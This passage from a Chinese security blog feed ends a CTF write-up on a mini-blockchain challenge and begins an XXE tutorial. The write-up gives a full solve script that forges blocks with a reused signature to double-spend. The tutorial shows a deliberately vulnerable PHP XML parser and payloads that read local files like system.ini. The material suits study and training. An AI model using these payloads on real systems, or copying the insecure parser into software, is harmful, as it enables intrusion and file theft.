    <span class="token keyword">return</span> <span class="token string">'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> shop_address

<span class="token keyword">def</span> <span class="token function">find_enough_utxos</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    collected <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">==</span> addr_from<span class="token punctuation">:</span>
            amount <span class="token operator">-=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
            collected<span class="token punctuation">.</span>append<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> collected<span class="token punctuation">,</span> <span class="token operator">-</span>amount
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'no enough DDCoins in '</span> <span class="token operator">+</span> addr_from<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    input_utxo_ids<span class="token punctuation">,</span> the_change <span class="token operator">=</span> find_enough_utxos<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>
    outputs <span class="token operator">=</span> <span class="token punctuation">[</span>create_output_utxo<span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> the_change <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        outputs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>create_output_utxo<span class="token punctuation">(</span>addr_from<span class="token punctuation">,</span> the_change<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> create_tx<span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">free_ddcoin</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'The bank has no money now.'</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        address <span class="token operator">=</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span>
        addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># to check if it is a valid address</span>
        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> bank_address<span class="token punctuation">,</span> address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b@cKd00R tr1993ReD'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
        <span class="token keyword">return</span> str<span class="token punctuation">(</span>balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' DDCoins are successfully sent to '</span> <span class="token operator">+</span> address
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'ERROR: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>

DIFFICULTY <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'00000'</span> <span class="token operator">+</span> <span class="token string">'f'</span> <span class="token operator">*</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/create_transaction'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create_tx_and_check_shop_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        block <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>block<span class="token punctuation">,</span> DIFFICULTY<span class="token punctuation">)</span>
        msg <span class="token operator">=</span> <span class="token string">'transaction finished.'</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>

    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1000000</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># when 1000000 DDCoins are received, the shop will give you a diamond</span>
        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># and immediately the shop will store the money somewhere safe.</span>
        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> shop_address<span class="token punctuation">,</span> shop_wallet_address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span><span class="token punctuation">,</span> shop_privkey<span class="token punctuation">)</span>
        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'save the DDCoins in a cold wallet'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
        msg <span class="token operator">+=</span> <span class="token string">' You receive a diamond.'</span>
    <span class="token keyword">return</span> msg


<span class="token comment" spellcheck="true"># if you mess up the blockchain, use this to reset the blockchain.</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/reset'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">reset_blockchain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'genesis_block_hash'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">'reset.'</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/source_code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_source_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'serve.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
        html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
    source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> html

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span></code></pre>
<p>其余函数功能：</p>
<ul>
<li>addr_to_pubkey：检查地址有效性</li>
<li>pubkey_to_address：生成钱包地址</li>
<li>gen_addr_key_pair：生成钱包地址</li>
<li>create_output_utxo：创建一个utxo</li>
<li>create_tx：创建一个tx</li>
<li>create_block：创建一个block</li>
<li>find_blockchain_tail：查询最后一个block</li>
<li>calculate_utxo：得到所有utxo</li>
<li>calculate_balance：计算钱包的余额</li>
<li>verify_utxo_signature：验证utxo签名</li>
<li>append_block：添加块</li>
<li>init：初始化函数</li>
<li>get_balance_of_all：得到所有block，所有地址和utxo</li>
<li>homepage：web主页</li>
<li>getFlag：flag获取页面</li>
</ul>
<h2 id="51-双花攻击"><a href="#51-双花攻击" class="headerlink" title="51% 双花攻击"></a>51% 双花攻击</h2><ol>
<li>这道题整的解法是 51% （双花）攻击。</li>
<li>请于正常的区块链区分开来，题目环境中只有你一个玩家，并没有人与你竞争（挖矿）。</li>
<li>商店交易采用0确认，而不是现实中的6确认。</li>
<li>当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链。<br>区块链允许添加空块</li>
<li>51%（双花）攻击可以达到的目的就是使攻击前的交易作废，这里的前不一定是前一个，而是很大程度上取决于你的算力的。让之前的交易作废有什么好处呢？这里我们就要考虑0确认和6确认的区别了。</li>
</ol>
<p>当产生一笔交易时，区块链的P2P网络会广播这笔交易，这笔交易会被一个挖矿节点收到，并验证，如果这个挖矿节点挖到区块（生成的hash满足条件）后，并且这笔交易的手续费足够吸引这个节点去打包进区块，那这笔交易就会被打包进区块。因此就得到了一个确认，这个矿工也拿走了相应的手续费。 这个挖矿节点打包后，会把区块广播给其他节点。其他节点验证并广播这个区块。 如果这个区块得到更多的挖矿节点的验证确认，那就得到了更多的确认。这样这笔交易就被记录到了比特币区块链，并成为了比特币账本的一部分。如果得到6个确认后，我们就认为它永远不可变了。</p>
<p>0确认就同样的道理了，那就是不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。</p>
<p>可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。好在，题目并不是采用6确认。</p>
<p>然后再看看这里的51% 攻击，其实这里说的51%是指算力，也就是这种攻击需要攻击者具备全网51%的算力，因为这样才有机会使自己生成（挖出）区块的速度超过其他人，然后按区块链的规则：当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链，就达到了撤销原来链上已经存在的交易，拿回该交易使用了的钱的目的，这里我的另一个理解就是可以使交易回滚，从而追回被盗的钱。</p>
<p>![image-20211115170232249](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170232249.png)</p>
<p>![image-20211115170248426](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170248426.png)</p>
<p>按照流程，我们应该构造一个转钱给商店的区块。但通过代码，我们可以发现转账的时候是需要私钥签名的，也就是这个signature段。可以通过黑客留下的signature直接绕过，并且上一步的input也可以从黑客的区块中得到。所以我们就可以直接构造转账给商店的区块了，并且通过51%攻击使黑客转走的钱追回.</p>
<h3 id="构造方法一"><a href="#构造方法一" class="headerlink" title="构造方法一"></a>构造方法一</h3><p>这种办法只要POST空块即可，转账使用转账后门实现：</p>
<pre><code>创世块-&gt;黑客块-&gt;空块  
  │   
  └──&gt;空块(1)-&gt;空块(2)-&gt;空块(3)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石
                        │   
                        └──&gt;空块(4)-&gt;空块(5)-&gt;空块(6)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石</code></pre>
<ul>
<li>当POST第三个空块时，主链改变，黑客提走的钱被追回，通过转账后门与POST触发新增两个区块，总长为六块</li>
<li>接上第三个空块，POST到第六个空块时，主链再次改变，钱又重新回到银行，再次利用后门得到钻石</li>
</ul>
<h3 id="构造方法二"><a href="#构造方法二" class="headerlink" title="构造方法二"></a>构造方法二</h3><pre><code>创世块-&gt;黑客块-&gt;空块  
  │   
  └──&gt;转账给商店块(1)-&gt;空块(2)-&gt;空块(3)--自动触发--&gt;购买钻石
                                │   
                                └──&gt;空块(4)-&gt;空块(5)-&gt;自动触发--&gt;购买钻石</code></pre>
<ul>
<li>伪造具有一个银行转给商店的交易记录的区块，这里要伪造tx数据块中的签名</li>
<li>签名是通过tx数据库中的input（付款utxo的id）和付款方的私钥算出</li>
<li>所以直接利用黑客块中的签名即可</li>
<li>当POST到第三块时，主链改变，100w在商店余额中，自动触发购买钻石</li>
<li>接上第三块，POST到第五块时主链再猜改变，自动触发购买钻石</li>
</ul>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class=" language-Python"><code class="language-Python"># -*- encoding: utf-8 -*-
# written in python 2.7
import hashlib, json, rsa, uuid, os,requests,re

# 一堆变量常量

url_root="http://111.200.241.244:61460/"
url_create="http://111.200.241.244:61460/create_transaction"
url_flag="http://111.200.241.244:61460/flag"

s=requests.Session()
ddcoin = s.get(url=url_root)

prev_one=re.search(r"hash of genesis block: ([0-9a-f]{64})",ddcoin.content, flags=0).group(1)
bank_utox_id=re.search(r"\"input\": \[\"([0-9a-f\-]{36})",ddcoin.content, flags=0).group(1)
bank_signature=re.search(r"\"signature\": \[\"([0-9a-f]{96})",ddcoin.content, flags=0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr="998f49e4bccfc44ef96313c9be35c2252aee17172118719b7c744bc9033ef3f5904e9a649bc4fab5c4cb3f3d5cac72a5"
hacke_addr="a8af0c41afd2a78f21ca61d85c84e81acbe4639e31b7ad8988ca0602163451b8bb1d0cb72aaa2bdc9feeecf5411c72bb"
shop_addr="92b84ee514126392f3e18a960900c82699aa88c666c1e4466878582e2cc18e1869f7a51e9b6f1d5f159ce9e63fadd5e7"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x)+hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block=create_block(prev,str(i),tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash<DIFFICULTY:
            print json.dumps(current_block)
            return current_block

def create_feak_one():
    utxo_first=create_output_utxo(shop_addr,1000000)
    tx_first=create_tx([bank_utox_id],[utxo_first])
    return check_hash(prev_one,[tx_first])

def create_empty_block(prev):
    return check_hash(prev,[])


# 攻击过程

a=create_feak_one()
print s.post(url=url_create,data=str(json.dumps(a))).content
b=create_empty_block(a['hash'])
print s.post(url=url_create,data=str(json.dumps(b))).content
c=create_empty_block(b['hash'])
print s.post(url=url_create,data=str(json.dumps(c))).content
d=create_empty_block(c['hash'])
print s.post(url=url_create,data=str(json.dumps(d))).content
e=create_empty_block(d['hash'])
print s.post(url=url_create,data=str(json.dumps(e))).content
print s.get(url=url_flag).content
</code></pre>
<p>![image-20211115114730993](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115114730993.png)</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>DDCTF2018-区块链：</p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/">https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/</a></p>
<p>从DDCTF中看区块链安全之51%攻击：</p>
<p><a href="https://bbs.ichunqiu.com/thread-39743-1-2.html">https://bbs.ichunqiu.com/thread-39743-1-2.html</a></p>
<p>攻防世界web进阶区Web_python_block_chain详解：</p>
<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108111692">https://blog.csdn.net/hxhxhxhxx/article/details/108111692</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>Web:XXE漏洞</title>
    <url>/2021/05/26/web-xxe-lou-dong/</url>
    <content><![CDATA[<h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png" alt="img"></a></p>
<p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE</p>
<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</p>
<h2 id="二、简单介绍一下背景知识："><a href="#二、简单介绍一下背景知识：" class="headerlink" title="二、简单介绍一下背景知识："></a><strong>二、简单介绍一下背景知识：</strong></h2><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p>
<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。  外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。  但是，在处理外部实体时，可以针对应用程序启动许多攻击。  这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。  通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
<h2 id="三、基础知识"><a href="#三、基础知识" class="headerlink" title="三、基础知识"></a><strong>三、基础知识</strong></h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;?xml version="1.0"?&gt;//这一行是 XML 文档定义
&lt;!DOCTYPE message [
&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
&lt;!ELEMENT receiver (#PCDATA)&gt;
&lt;!ELEMENT sender (#PCDATA)&gt;
&lt;!ELEMENT header (#PCDATA)&gt;
&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre>
<p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;message&gt;
&lt;receiver&gt;Myself&lt;/receiver&gt;
&lt;sender&gt;Someone&lt;/sender&gt;
&lt;header&gt;TheReminder&lt;/header&gt;
&lt;msg&gt;This is an amazing book&lt;/msg&gt;
&lt;/message&gt;</code></pre>
<p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe "test" &gt;]&gt;</code></pre>
<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;</code></pre>
<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
<h3 id="重点来了："><a href="#重点来了：" class="headerlink" title="重点来了："></a><strong>重点来了：</strong></h3><p><strong>重点一：</strong></p>
<p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
&lt;creds&gt;
    &lt;user&gt;&amp;xxe;&lt;/user&gt;
    &lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;</code></pre>
<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p>
<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
<pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre>
<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
<p><strong>重点二：</strong></p>
<p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p>
<p><strong>1.通用实体</strong></p>
<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt; 
&lt;updateProfile&gt;  
    &lt;firstname&gt;Joe&lt;/firstname&gt;  
    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
    ... 
&lt;/updateProfile&gt;</code></pre>
<p><strong>2.参数实体：</strong></p>
<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br> (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br> (3)和通用实体一样，参数实体也可以外部引用</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; 
&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"&gt; 
%an-element; %remote-dtd;</code></pre>
<p><strong>抛转：</strong></p>
<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
<h2 id="四、我们能做什么"><a href="#四、我们能做什么" class="headerlink" title="四、我们能做什么"></a><strong>四、我们能做什么</strong></h2><p>上一节疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p>
<p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p>
<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;</code></pre>
<p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p>
<h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p>
<p>本地服务器上放上解析 XML 的 php 代码：</p>
<p><strong>示例代码：</strong></p>
<p><strong>xml.php</strong></p>
<pre><code>&lt;?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?&gt;</code></pre>
<p><strong>payload:</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre>
<p><strong>结果如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png" alt="img"></a></p>
<p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p>
<p><strong>如图所示：</strong></p>
